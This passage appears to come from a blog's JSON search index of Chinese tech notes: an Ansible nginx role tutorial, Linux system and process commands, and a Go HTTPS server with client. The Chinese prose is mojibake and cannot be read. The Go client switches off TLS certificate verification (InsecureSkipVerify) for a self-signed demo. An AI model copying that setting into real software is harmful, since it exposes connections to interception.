/etc/ssl/sfh/sfh.crt\n```\n\n+ Note:å¦‚æœæ‚¨æœ‰æ•æ„Ÿä¿¡æ¯æ·»åŠ åˆ°å˜é‡æ–‡ä»¶ä¸­ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ansible-vaultåŠ å¯†æ–‡ä»¶ã€‚\n\n\n\n##### 4.2.6 ä»»åŠ¡ï¼ˆtasksï¼‰\n\ntasksç›®å½•åŒ…å«ä¸€ä¸ªmain.ymlæ–‡ä»¶, ä½¿ç”¨è§’è‰²æ—¶è¿è¡Œçš„ä¸»æ–‡ä»¶æ˜¯tasks/main.ymlæ–‡ä»¶ã€‚çœ‹çœ‹æˆ‘ä»¬çš„ç”¨ä¾‹å°†ä¼šæ˜¯ä»€ä¹ˆæ ·çš„ï¼š\n\n```yml\n---\n- name: Add Nginx Repository\n  apt_repository:\n    repo: ppa:nginx/stable\n    state: present\n\n- name: Install Nginx\n  apt:\n    pkg: nginx\n    state: installed\n    update_cache: true\n  notify:\n    - Start Nginx # åœ¨handleræ–‡ä»¶å¤¹é‡Œ\n\n- name: Add H5BP Config\n  copy:\n    src: h5bp\n    dest: /etc/nginx\n    owner: root\n    group: root\n\n- name: Disable Default Site Configuration\n  file:\n    dest: /etc/nginx/sites-enabled/default\n    state: absent\n\n# `dest` in quotes as a variable is used!\n- name: Add SFH Site Config\n  register: sfhconfig\n  template:\n    src: serversforhackers.com.j2\n    dest: '/etc/nginx/sites-available/{{ domain }}.conf' \n    owner: root\n    group: root\n\n# `src`/`dest` in quotes as a variable is used!\n- name: Enable SFH Site Config\n  file:\n    src: '/etc/nginx/sites-available/{{ domain }}.conf'\n    dest: '/etc/nginx/sites-enabled/{{ domain }}.conf'\n    state: link\n\n# `dest` in quotes as a variable is used!\n- name: Create Web root\n  file:\n    dest: '/var/www/{{ domain }}/public'\n    mode: 775\n    state: directory\n    owner: www-data\n    group: www-data\n  notify:\n    - Reload Nginx\n\n# `dest` in quotes as a variable is used!\n- name: Web Root Permissions\n  file:\n   dest: '/var/www/{{ domain }}'\n   mode: 775\n   state: directory\n   owner: www-data\n   group: www-data\n   recurse: yes\n  notify:\n    - Reload Nginx\n```\n\nè¿™ä¸€ç³»åˆ—ä»»åŠ¡ä½¿å¾—nginxèƒ½è¢«å®Œæ•´çš„å®‰è£…ã€‚ä»»åŠ¡æŒ‰ç…§å‡ºç°çš„é¡ºåºå®Œæˆä»¥ä¸‹å·¥ä½œï¼š\n\n```\n1 æ·»åŠ nginx / stableåº“\n2 å®‰è£…å¹¶å¯åŠ¨nginx\n3 æ·»åŠ H5BPé…ç½®æ–‡ä»¶\n4 ä»sites-enabledç›®å½•ä¸­åˆ é™¤æ–‡ä»¶çš„ç¬¦å·é“¾æ¥æ¥ç¦ç”¨é»˜è®¤çš„nginxé…ç½®\n5 å°†serversforhackers.com.conf.j2è™šæ‹Ÿä¸»æœºæ¨¡æ¿å¤åˆ¶åˆ°nginxé…ç½®ä¸­ï¼Œæ¸²æŸ“æ¨¡æ¿\n6 é€šè¿‡å°†å…¶ç¬¦å·é“¾æ¥åˆ°sites-enabledç›®å½•æ¥å¯ç”¨NginxæœåŠ¡å™¨é…ç½®\n7 åˆ›å»ºWebæ ¹ç›®å½•\n8 æ›´æ”¹é¡¹ç›®æ ¹ç›®å½•çš„æƒé™ï¼ˆé€’å½’ï¼‰ï¼Œè¯¥ç›®å½•ä½äºä¹‹å‰åˆ›å»ºçš„Webæ ¹ç›®å½•ä¹‹ä¸Š\n```\n\næœ‰ä¸€äº›æ–°çš„æ¨¡å—ï¼ˆå’Œä¸€äº›æˆ‘ä»¬å·²ç»æ¶µç›–çš„æ–°ç”¨é€”ï¼‰ï¼ŒåŒ…æ‹¬å¤åˆ¶ï¼Œæ¨¡æ¿å’Œæ–‡ä»¶æ¨¡å—ã€‚é€šè¿‡è®¾ç½®æ¯ä¸ªæ¨¡å—çš„å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åšä¸€äº›æœ‰è¶£çš„äº‹æƒ…ï¼Œä¾‹å¦‚ç¡®ä¿æ–‡ä»¶â€œä¸å­˜åœ¨â€ï¼ˆå¦‚æœå­˜åœ¨åˆ™åˆ é™¤å®ƒä»¬ï¼‰çš„state: absentï¼Œæˆ–è€…é€šè¿‡åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ä½œä¸ºç¬¦å·é“¾æ¥çš„state: linkã€‚æ‚¨åº”è¯¥æ£€æŸ¥æ¯ä¸ªæ¨¡å—çš„æ–‡æ¡£ï¼Œä»¥æŸ¥çœ‹å¯ä»¥ç”¨å®ƒä»¬å®Œæˆå“ªäº›æœ‰è¶£å’Œæœ‰ç”¨çš„äº‹æƒ…ã€‚\n\nå‚åŠ å®˜æ–¹æ–‡æ¡£: https://docs.ansible.com/ansible/latest/modules/\n\n\n\n##### 4.3 è¿è¡Œè§’è‰²ï¼ˆrunning the Roleï¼‰\n\nè¦å¯¹æœåŠ¡å™¨è¿è¡Œä¸€ä¸ªæˆ–å¤šä¸ªè§’è‰²ï¼Œæˆ‘ä»¬å°†é‡æ–°ä½¿ç”¨å¦ä¸€ä¸ªplaybookã€‚è¯¥playbookä¸rolesç›®å½•ä½äºåŒä¸€ä¸ªç›®å½•ä¸­ï¼ŒåŒä¸€å±‚çº§ã€‚å½“æˆ‘ä»¬ç”¨ansible-playbookå‘½ä»¤è¿è¡Œçš„æ—¶å€™éœ€è¦å…ˆcdè¿›å…¥åˆ°è¯¥ç›®å½•ä¸­ã€‚ \n\nè®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªâ€œä¸»â€çš„yamlæ–‡ä»¶ï¼ˆè¢«ansible-playbookå‘½ä»¤æ‰§è¡Œçš„æ–‡ä»¶ï¼‰ï¼Œè¯¥æ–‡ä»¶å®šä¹‰è¦ä½¿ç”¨çš„è§’è‰²ä»¥åŠè¿è¡Œå®ƒä»¬çš„ä¸»æœºï¼š æ–‡ä»¶~/ansible-example/server.ymlä½äºä¸rolesç›®å½•ç›¸åŒçš„ç›®å½•ä¸­ï¼š(æ³¨æ„æ˜¯å’Œrolesç›®å½•åŒå±‚çº§!!!!!)\n\n```yml\n---\n- hosts: local\n  connection: local\n  roles:\n    - nginx # è¿™ä¸ªæ˜¯ä½ åˆšæ‰å†™çš„nginx role\n```\n\næ‰€ä»¥ï¼Œæˆ‘ä»¬åªæ˜¯å®šä¹‰è§’è‰²ï¼Œè€Œä¸æ˜¯åœ¨æœ¬playbookæ–‡ä»¶ä¸­å®šä¹‰æ‰€æœ‰çš„å˜é‡å’Œä»»åŠ¡ã€‚è§’è‰²è´Ÿè´£å…·ä½“ç»†èŠ‚ã€‚ç„¶åæˆ‘ä»¬å¯ä»¥è¿è¡Œè§’è‰²ï¼š\n\n```bash\nansible-playbook -i ./hosts server.yml\n```\n\nä»¥ä¸‹æ˜¯è¿è¡Œnginxè§’è‰²çš„playbookæ–‡ä»¶çš„è¾“å‡ºï¼š\n\n```bash\nPLAY [all] ********************************************************************\n\nGATHERING FACTS ***************************************************************\nok: [127.0.0.1]\n\nTASK: [nginx | Add Nginx Repository] ******************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Install Nginx] *************************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Add H5BP Config] ***********************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Disable Default Site] ******************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Add SFH Site Config] *******************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Enable SFH Site Config] ****************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Create Web root] ***********************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Web Root Permissions] ******************************************\nok: [127.0.0.1]\n\nNOTIFIED: [nginx | Start Nginx] ***********************************************\nok: [127.0.0.1]\n\nNOTIFIED: [nginx | Reload Nginx] **********************************************\nchanged: [127.0.0.1]\n\nPLAY RECAP ********************************************************************\n127.0.0.1                  : ok=8   changed=7   unreachable=0    failed=0\n```\n\næˆ‘ä»¬å°†æ‰€æœ‰å„ç§ç»„ä»¶æ”¾åœ¨ä¸€èµ·ï¼Œå½¢æˆä¸€è‡´çš„è§’è‰²ï¼Œç°åœ¨å·²ç»å®‰è£…å¹¶é…ç½®äº†nginxï¼\n\n\n\n### 5. ansibleäº‹å®(facts)\n\nè¯·æ³¨æ„ï¼Œè¿è¡Œå‰§æœ¬æ—¶çš„ç¬¬ä¸€è¡Œæ€»æ˜¯â€œæ”¶é›†äº‹å®â€ã€‚ åœ¨è¿è¡Œä»»ä½•ä»»åŠ¡ä¹‹å‰ï¼Œansibleå°†æ”¶é›†æœ‰å…³å…¶é…ç½®çš„ç³»ç»Ÿçš„ä¿¡æ¯ã€‚è¿™äº›è¢«ç§°ä¸ºäº‹å®ï¼Œå¹¶ä¸”åŒ…æ‹¬å¹¿æ³›çš„ç³»ç»Ÿä¿¡æ¯ï¼Œå¦‚CPUæ ¸å¿ƒæ•°é‡ï¼Œå¯ç”¨çš„ipv4å’Œipv6ç½‘ç»œï¼ŒæŒ‚è½½çš„ç£ç›˜ï¼ŒLinuxå‘è¡Œç‰ˆç­‰ç­‰ã€‚\n\näº‹å®åœ¨â€œä»»åŠ¡â€æˆ–â€œæ¨¡æ¿â€é…ç½®ä¸­é€šå¸¸å¾ˆæœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œnginxé€šå¸¸è®¾ç½®ä¸ºä½¿ç”¨ä¸cpuå†…æ ¸ä¸€æ ·å¤šçš„å·¥ä½œå¤„ç†å™¨ã€‚çŸ¥é“è¿™ä¸€ç‚¹ï¼Œæ‚¨å¯ä»¥é€‰æ‹©å¦‚ä¸‹è®¾ç½®nginx.conf.j2æ–‡ä»¶çš„æ¨¡æ¿ï¼š\n\n```nginx\nuser www-data;\nworker_processes {{ ansible_processor_cores }};\npid /var/run/nginx.pid;\n\n# And other configurations...\n```\n\næˆ–è€…å¦‚æœä½ å…·æœ‰å¤šä¸ªcpuçš„æœåŠ¡å™¨ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ï¼š\n\n```nginx\nuser www-data;\nworker_processes {{ ansible_processor_cores * ansible_processor_count }};\npid /var/run/nginx.pid;\n\n# And other configurations...\n```\n\næ‰€æœ‰çš„ansible factså…¨å±€å˜é‡éƒ½æ˜¯ä»¥â€œanisble_â€ä¸ºå‰ç¼€ï¼Œå¹¶ä¸”å¯ä»¥åœ¨å…¶ä»–ä»»ä½•åœ°æ–¹ä½¿ç”¨ã€‚ å°è¯•å¯¹ä½ çš„æœ¬åœ°æœºå™¨è¿è¡Œä»¥ä¸‹å†…å®¹ä»¥æŸ¥çœ‹å¯ç”¨çš„äº‹å®ï¼š\n\n```bash\n# Run against a local server\n# Note that we say to use \"localhost\" instead of defining a hosts file here!\nansible -m setup --connection=local localhost\n\n# Run against a remote server\nansible -i ./hosts remote -m setup\n```\n\n\n\n### 6. ansibleé‡åˆ°çš„é—®é¢˜æ€»ç»“\n\n+ é‡åˆ°è§’è‰²æ²¡æœ‰çš„é—®é¢˜, ERROR! the role 'Stouts.ntp' was not found\n\n  é€šè¿‡ansible-galaxyå®‰è£… \n\n  ```\n  ansible-galaxy install stouts.ntp\n  ```\n\n+ ansibleçš„å…¨å±€é…ç½®ansible.cfg\n\n  å¦‚é»˜è®¤æ˜¯å¦éœ€è¦è¾“å…¥å¯†ç ã€æ˜¯å¦å¼€å¯sudoè®¤è¯ã€action_pluginsæ’ä»¶çš„ä½ç½®ã€hostsä¸»æœºç»„çš„ä½ç½®ã€æ˜¯å¦å¼€å¯logåŠŸèƒ½ã€é»˜è®¤ç«¯å£ã€keyæ–‡ä»¶ä½ç½®ç­‰ç­‰ã€‚\n  \n  å‚è§: https://www.cnblogs.com/paul8339/p/6159220.htm\n\n+ hostæ–‡ä»¶æŠŠä¸€ä¸ªç»„ä½œä¸ºå¦ä¸€ä¸ªç»„çš„å­æˆå‘˜ \n\n  ```\n  [atlanta]\n  host1\n  host2\n  \n  [raleigh]\n  host2\n  host3\n  \n  [southeast:children]\n  atlanta\n  raleigh\n  \n  [southeast:vars]\n  some_server=foo.southeast.example.com\n  halon_system_timeout=30\n  self_destruct_countdown=60\n  escape_pods=2\n  \n  [usa:children]\n  southeast\n  northeast\n  southwest\n  northwest\n  ```\n\n  atlanta raleighå°†ä½œä¸ºsoutheastå­ç»„ï¼Œç»§æ‰¿çˆ¶ç»„southeastä¸­some_serverç­‰å˜é‡\n\n  \n\n+ é™åˆ¶è„šæœ¬åªåœ¨æŒ‡å®šçš„ipå¯¹åº”çš„æœºå™¨ä¸Šæ‰§è¡Œã€‚\n\n   -l <SUBSET>, --limit <SUBSET>\n   \n\t```bash\n   ansible-playbook myplaybook.yml -l 10.11.12.13\n   ```\n\n\n\n+ æ‰“æ ‡ç­¾å½’ç±», æŒ‡å®šå½’ç±»ç›¸å…³çš„task\n\n  ```yml\n  ---\n  - include: restart.yml\n    tags:\n      - tag2\n  - include: push.yml\n    tags:\n      - tag1\n  ```\n\n  tagsä¸»è¦ç›®çš„æ˜¯å•ç‹¬æ‰§è¡ŒæŒ‡å®šçš„tagï¼Œä½¿ç”¨-t æˆ–è€…--tags è¡¨ç¤ºã€‚æ—§ç‰ˆæœ¬ä¸æ˜¯è¿™æ ·å†™çš„ï¼Œä¼šç›´æ¥åœ¨includeåé¢åŠ ä¸Štags=xxx,ä½†æ˜¯åœ¨æ–°ç‰ˆæœ¬çš„ansibleæ‰§è¡Œæ—¶è™½ç„¶ä¸æŠ¥é”™ï¼Œä½†æ˜¯ä¹Ÿä¸æ‰§è¡Œè¯¥tagã€‚\n\n\n\n### 7. å‚è€ƒèµ„æ–™\n\n+ [éå¸¸å¥½çš„Ansibleå…¥é—¨æ•™ç¨‹ï¼ˆè¶…ç®€å•ï¼‰](https://blog.csdn.net/pushiqiang/article/details/78126063)\n\n+ [Ansible å¿«é€Ÿå…¥é—¨](https://www.cnblogs.com/dachenzi/p/8916521.html)\n\n+ [ansibleè‡ªåŠ¨åŒ–è¿ç»´æ•™ç¨‹](https://www.w3cschool.cn/automate_with_ansible/ )\n\n+ https://docs.ansible.com/ansible/latest/modules/ å®˜æ–¹æ–‡æ¡£ \n\n  \n\n","tags":["ansible"],"categories":["è½¯ä»¶"]},{"title":"linuxå¸¸ç”¨å‘½ä»¤æ€»ç»“","url":"%2Fp%2F1d063ae7.html","content":"\n# 1. æŸ¥çœ‹linuxç³»ç»Ÿä¿¡æ¯\n\n### 1.1 æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬\n\n```bash\n#lsb_release -a \nNo LSB modules are available.\nDistributor ID: Ubuntu\nDescription:    Ubuntu 16.04.6 LTS\nRelease:        16.04\nCodename:       xenial\n\n#uname -srm  \nLinux 4.15.0-1060-gcp x86_64\n\n#cat /etc/os-release\nNAME=\"Ubuntu\"\nVERSION=\"16.04.6 LTS (Xenial Xerus)\"\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME=\"Ubuntu 16.04.6 LTS\"\nVERSION_ID=\"16.04\"\nHOME_URL=\"http://www.ubuntu.com/\"\nSUPPORT_URL=\"http://help.ubuntu.com/\"\nBUG_REPORT_URL=\"http://bugs.launchpad.net/ubuntu/\"\nVERSION_CODENAME=xenial\nUBUNTU_CODENAME=xenial\n\n#cat /proc/version\nLinux version 4.15.0-1060-gcp (buildd@lcy01-amd64-028) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12)) #64-Ubuntu SMP Thu Mar 26 03:21:15 UTC 2020\n\n#cat /etc/issue\nUbuntu 16.04.6 LTS \\n \\l\n```\n\n<!-- more -->\n\n### 1.2 æŸ¥çœ‹ç¡¬ç›˜å†…å­˜ CPU\n\n##### 1.2.1 æŸ¥çœ‹ç¡¬ç›˜\n\n```bash\n# df -h  æŸ¥çœ‹ç£ç›˜ç©ºé—´\nFilesystem      Size  Used Avail Use% Mounted on\nudev            986M     0  986M   0% /dev\ntmpfs           200M   22M  179M  11% /run\n/dev/sda1        29G  5.6G   24G  20% /\n\n\n#fdisk -l  æŸ¥çœ‹Linuxä¸­çš„æ‰€æœ‰ç£ç›˜åˆ†åŒº\nDisk /dev/sda: 30 GiB, 32212254720 bytes, 62914560 sectors\nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 4096 bytes\nI/O size (minimum/optimal): 4096 bytes / 4096 bytes\nDisklabel type: gpt\nDisk identifier: A03F431A-7AE6-406D-B233-EED234598EEE\n\nDevice      Start      End  Sectors  Size Type\n/dev/sda1  227328 62914526 62687199 29.9G Linux filesystem\n/dev/sda14   2048    10239     8192    4M BIOS boot\n/dev/sda15  10240   227327   217088  106M EFI System\n```\n\n##### 1.2.1 æŸ¥çœ‹å†…å­˜\n\n```bash\n# free -h æŸ¥çœ‹å†…å­˜\n              total        used        free      shared  buff/cache   available\nMem:           1.9G        769M        211M         21M        1.0G        1.0G\nSwap:            0B          0B          0B\n```\n\n##### 1.2.2 æŸ¥çœ‹ CPU\n\n```bash\n# lscpu\nArchitecture:          x86_64\nCPU op-mode(s):        32-bit, 64-bit\nByte Order:            Little Endian\nCPU(s):                2\n\n# cat /proc/cpuinfo   æŸ¥çœ‹ CPU ä¿¡æ¯\nprocessor       : 0\nvendor_id       : GenuineIntel\ncpu family      : 6\nmodel           : 63\nmodel name      : Intel(R) Xeon(R) CPU @ 2.30GHz\nstepping        : 0\nmicrocode       : 0x1\ncpu MHz         : 2300.000\ncache size      : 46080 KB\n\n# cat /proc/cpuinfo| grep \"processor\"| wc -l   æŸ¥çœ‹ CPU ä¸ªæ•°\n2\n```\n\n\n\n# 2. è¿›ç¨‹ç«¯å£ç›¸å…³\n\n### 2.1 æŸ¥è¯¢è¿›ç¨‹\n\n```bash\nps     # displays processes for the current shell.\nps -ef # Display every active process on a Linux system in generic (Unix/Linux) format.\nps -aux # Display all processes in BSD format.\n```\n\n\n\n### 2.2 æŸ¥è¯¢ç«¯å£\n\n```bash\n#1. è¿™ç±»å‘½ä»¤ä¸€å®šè¦ç”¨sudo\n#2. a: all p: procee, t:tcp, u:udp, l:æ­£åœ¨ç›‘å¬çš„ , n: ç¦æ­¢åŸŸåè§£æ, åªæ˜¾ç¤ºæ•°å­—ip\nsudo netstat -anp | grep 80\nsudo netstat -tunlp | grep 80\n\n\n# çŸ¥é“è¿›ç¨‹åå­—åæŸ¥ç«¯å£\nps -ef | grep processName  #å¾—åˆ°processID\nnetstat -anp | grep processID #pèƒ½æ˜¾ç¤ºå‡ºè¿›ç¨‹åå’Œè¿›ç¨‹id, è¿‡æ»¤å¾—åˆ°ç«¯å£\n\n# çŸ¥é“ç«¯å£åæŸ¥è¿›ç¨‹åå­—\nsudo lsof -i :80\n\n# ä¸€ä¸ªå‘½ä»¤æå®š\nsudo netstat -anp | grep processID\nsudo netstat -anp | grep processName\n```\n\n\n\n### 2.3 è¿›ç¨‹ç®¡ç†å™¨\n\n```bash\n# top\ntop - 13:41:19 up 83 days,  2:53,  1 user,  load average: 0.21, 0.85, 0.72\nTasks: 148 total,   1 running, 106 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  7.0 us,  4.1 sy,  0.0 ni, 88.4 id,  0.2 wa,  0.0 hi,  0.3 si,  0.0 st\nKiB Mem :  2040116 total,   212880 free,   789056 used,  1038180 buff/cache\nKiB Swap:        0 total,        0 free,        0 used.  1040512 avail Mem\n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND\n30844 root      20   0  572436 296072  16972 S   4.7 14.5   4235:28 kube-apiserver\n31035 root      20   0  643968  55980  20080 S   4.3  2.7   3362:32 kubelet\n30735 root      20   0 10.121g  67348  10588 S   2.3  3.3   1994:44 etcd\n```\n\n+ ç¬¬ä¸€è¡Œçš„å‚æ•°\n\n  **10:59:22**  : å½“å‰ç³»ç»Ÿæ—¶é—´\n   **up 37 days, 20:48**  : ç³»ç»Ÿç´¯ç§¯ä»¥åŠè¿è¡Œçš„æ—¶é—´\n   **3 users** : å½“å‰ç”¨æˆ·æ•°é‡\n   **load average: 0.00,0.00,0.00** : ç³»ç»Ÿè´Ÿè½½çš„ä¸‰ä¸ªæ•°å€¼åˆ†åˆ«è¡¨ç¤ºçš„æ˜¯1åˆ†é’Ÿï¼Œ5åˆ†é’Ÿå’Œ15åˆ†é’Ÿç³»ç»Ÿè´Ÿè½½çš„å¹³å‡å€¼\n\n  å½“CPUå®Œå…¨ç©ºé—²çš„æ—¶å€™ï¼Œå¹³å‡è´Ÿè·ä¸º0ï¼›å½“CPUå·¥ä½œé‡é¥±å’Œçš„æ—¶å€™ï¼Œå¹³å‡è´Ÿè·ä¸º1ã€‚nä¸ªCPUçš„ç”µè„‘ï¼Œå¯æ¥å—çš„ç³»ç»Ÿè´Ÿè·æœ€å¤§ä¸ºn.0ã€‚\n\n+ ç¬¬äºŒè¡Œçš„å‚æ•°\n\n   **Tasksï¼š 112 total** : è¿›ç¨‹æ€»æ•°\n   **1 running** : æ­£å¸¸è¿è¡Œçš„è¿›ç¨‹æ•°é‡\n   **121 sleeping** : ä¼‘çœ çš„è¿›ç¨‹æ•°é‡\n   **0 stopped** : åœæ­¢çš„è¿›ç¨‹æ•°é‡\n   **0 zombie** : åƒµæ­»è¿›ç¨‹æ•°é‡\n\n+ ç¬¬ä¸‰è¡Œçš„å‚æ•°\n\n  **0.2 us** : ç”¨æˆ·è¿›ç¨‹å ç”¨cpuèµ„æºçš„ç™¾åˆ†æ¯”\n   **0.2 sy** : å†…æ ¸è¿›ç¨‹å ç”¨cpuèµ„æºçš„ç™¾åˆ†æ¯”\n   **0.0 ni** : ç”¨æˆ·è¿›ç¨‹ç©ºé—´å†…æ”¹å˜è¿‡ä¼˜å…ˆçº§çš„è¿›ç¨‹å cpuèµ„æºçš„ç™¾åˆ†æ¯”\n   **99.7 id** : ç©ºé—²cpuç™¾åˆ†æ¯”\n   **0.0 wa** : ç­‰å¾…ioçš„è¿›ç¨‹å cpuèµ„æºçš„ç™¾åˆ†æ¯”\n   **0.0 hi** : ç¡¬ä¸­æ–­å ç”¨cpuçš„ç™¾åˆ†æ¯”\n   **0.0 si**: è½¯ä¸­æ–­å ç”¨çš„ç™¾åˆ†æ¯”\n   **0.0 st** : è™šæ‹Ÿæœºå ç”¨ç™¾åˆ†æ¯”\n\n+ ç¬¬å››è¡Œçš„æ„ä¹‰\n\n  **524280k total** : äº¤æ¢åŒºå†…å­˜æ€»å®¹é‡\n  **0k used** : äº¤æ¢åŒºå†…å­˜ä½¿ç”¨çš„å®¹é‡\n  **524280k used**: äº¤æ¢åŒºç©ºé—²çš„å†…å­˜å®¹é‡\n  **848380k cached** : ç¼“å­˜çš„äº¤æ¢åŒºæ€»é‡\n\n+ è¿›ç¨‹çš„æ„ä¹‰\n   **PID** : è¿›ç¨‹idï¼Œæ ‡è®°å”¯ä¸€è¿›ç¨‹\n   **USER** : è¿›ç¨‹ç”¨æˆ·å\n   **PR** : ä¼˜å…ˆçº§\n   **NI** : niceå€¼ã€‚è´Ÿå€¼è¡¨ç¤ºé«˜ä¼˜å…ˆçº§ï¼Œæ­£å€¼è¡¨ç¤ºä½ä¼˜å…ˆçº§\n   **VIRT** : è¿›ç¨‹ä½¿ç”¨çš„è™šæ‹Ÿå†…å­˜çš„å¤§å°\n   **RES** : æŒ‡è¿›ç¨‹é™¤å»ä½¿ç”¨äº¤æ¢åŒºswapçš„å†…å­˜ï¼Œä½¿ç”¨çš„ç‰©ç†å†…å­˜çš„å¤§å°\n   **SHR** : è¿›ç¨‹å…±äº«å†…å­˜çš„å¤§å°\n   **S** : process status è¿›ç¨‹çŠ¶æ€ ã€‚ åˆ†åˆ«æœ‰D R S T Z ,åˆ†åˆ«è¡¨ç¤ºä¸å¯ä¸­æ–­çš„ä¼‘çœ ã€æ­£åœ¨è¿è¡Œã€ä¼‘çœ ä¸­ã€æš‚åœæˆ–è€…è·Ÿè¸ªçŠ¶æ€ã€åƒµæ­»çŠ¶æ€\n   **%CPU** : cpuçš„ä½¿ç”¨é‡å æ€»cpuæ—¶é—´çš„ç™¾åˆ†æ¯”\n   **%MEM** : è¿›ç¨‹ä½¿ç”¨çš„ç‰©ç†å†…å­˜ç™¾åˆ†æ¯”\n   **TIME+** : è¿›ç¨‹ä½¿ç”¨çš„CPUæ—¶é—´æ€»è®¡ï¼Œç²¾ç¡®åˆ°1/100ç§’\n   **COMMAND** : å‘½ä»¤æˆ–è€…è¿›ç¨‹åç§°\n\n\n\n# 3. ç³»ç»Ÿè®¾ç½®\n\n### 3.1 è®¾ç½®linuxæ—¶é—´å’Œæ—¶åŒº\n\n```bash\n# è®¾ç½®æ—¶é—´\ndate -s \"2015-10-25 15:00:00\"\n\n#è®¾ç½®æ—¶åŒº\ntzselect  #å‘½ä»¤åªå‘Šè¯‰ä½ é€‰æ‹©çš„æ—¶åŒºçš„å†™æ³•ï¼Œå¹¶ä¸ä¼šç”Ÿæ•ˆã€‚\nåœ¨.bashrcæ·»åŠ   export TZ='Asia/Shanghai'\n```\n\n\n\n# 5. å…¶ä»–\n\n### 5.1 åŸŸåæŸ¥è¯¢\n\n```bash\nhost hostname [server]\n[server]ï¼šä½¿ç”¨ä¸æ˜¯ç”±/etc/resolv.confæ–‡ä»¶å®šä¹‰çš„DNSæœåŠ¡å™¨IPæ¥æŸ¥è¯¢æŸå°ä¸»æœºçš„IPã€‚\n\nhost www.baidu.com\nhost www.baidu.com 8.8.8.8\n\nhost google.com #Find the Domain IP Address\nhost -t ns google.com #Find Domain Name Servers, dns\nhost -t cname mail.google.com #Find Domain CNAME Record\nhost -t mx google.com #Find Domain MX Record\nhost -t txt google.com#Find Domain TXT Record\nhost -a google.com #Find All Information of Domain Records and Zones\n```\n\n\n\n\n\n# 10. å‚è€ƒæ•™ç¨‹\n\n+ https://linuxtools-rst.readthedocs.io/zh_CN/latest/","tags":["linux"],"categories":["å‘½ä»¤"]},{"title":"golangå¯åŠ¨https_server","url":"%2Fp%2Fd5ecb4c4.html","content":"\n\n\n# 1. golang å®ç°HTTPS Web Server\n\n+ ç”Ÿæˆç§é’¥å’Œè¯ä¹¦\n\n```\nopenssl genrsa -out server.key 2048 //ç”Ÿæˆç§é’¥\nopenssl req -new -x509 -key server.key -out server.pem -days 3650 //ç”Ÿæˆè¯ä¹¦\n```\n<!-- more -->\n\n+ server.go\n\n```\npackage main\n\t\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\t\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tfmt.Fprintf(w, \"Hi, This is an example of https service in golang!\")\n}\n\t\nfunc main() {\n\thttp.HandleFunc(\"/\", handler)\n\thttp.ListenAndServeTLS(\":8081\", \"server.pem\", \"server.key\", nil)\n}\n\t\n```\n\né€šè¿‡æµè§ˆå™¨è®¿é—®ï¼šhttps://localhost:8081 ä¼šå‡ºç°æ‚¨çš„è¿æ¥ä¸æ˜¯ç§å¯†è¿æ¥, å› ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯è‡ªç­¾å‘çš„æ•°å­—è¯ä¹¦\n\t\n\n+ å®¢æˆ·ç«¯è®¿é—®\n\n```\npackage main\n\t\nimport (\n\t\"crypto/tls\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\t\nfunc main() {\n\t//é€šè¿‡è®¾ç½®tls.Configçš„InsecureSkipVerifyä¸ºtrueï¼Œclientå°†ä¸å†å¯¹æœåŠ¡ç«¯çš„è¯ä¹¦è¿›è¡Œæ ¡éªŒã€‚\n\tts := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}} \n\tclient := &http.Client{Transport: ts}\n\t\n\tresp, err := client.Get(\"https://localhost:8081\")\n\tif err != nil {\n\t\tfmt.Println(\"error:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tfmt.Println(string(body))\n}\n```\n\n\n\n# 2. å¯¹æœåŠ¡ç«¯æ•°å­—è¯ä¹¦è¿›è¡ŒéªŒè¯\n\næ¥ä¸‹æ¥æˆ‘ä»¬æ¥éªŒè¯ä¸€ä¸‹å®¢æˆ·ç«¯å¯¹æœåŠ¡ç«¯æ•°å­—è¯ä¹¦è¿›è¡ŒéªŒè¯:\n\n- é¦–å…ˆæˆ‘ä»¬æ¥å»ºç«‹æˆ‘ä»¬è‡ªå·±çš„CAï¼Œéœ€è¦ç”Ÿæˆä¸€ä¸ªCAç§é’¥å’Œä¸€ä¸ªCAçš„æ•°å­—è¯ä¹¦:\n```\nopenssl genrsa -out ca.key 2048\n\t\nopenssl req -x509 -new -nodes -key ca.key -subj \"/CN=tonybai.com\" -days 5000 -out ca.crt\n```\n\n- æ¥ä¸‹æ¥ï¼Œç”Ÿæˆserverç«¯çš„ç§é’¥ï¼Œç”Ÿæˆæ•°å­—è¯ä¹¦è¯·æ±‚ï¼Œå¹¶ç”¨æˆ‘ä»¬çš„caç§é’¥ç­¾å‘serverçš„æ•°å­—è¯ä¹¦ï¼š\n\n```\nopenssl genrsa -out server.key 2048\n\t\nopenssl req -new -key server.key -subj \"/CN=localhost\" -out server.csr\n\t\nopenssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt -days 5000\n```\n\n- ç°åœ¨æˆ‘ä»¬çš„å·¥ä½œç›®å½•ä¸‹æœ‰å¦‚ä¸‹ä¸€äº›ç§é’¥å’Œè¯ä¹¦æ–‡ä»¶ï¼š\n\n```\nCA:\nç§é’¥æ–‡ä»¶ ca.key\næ•°å­—è¯ä¹¦ ca.crt\n\nServer:\nç§é’¥æ–‡ä»¶ 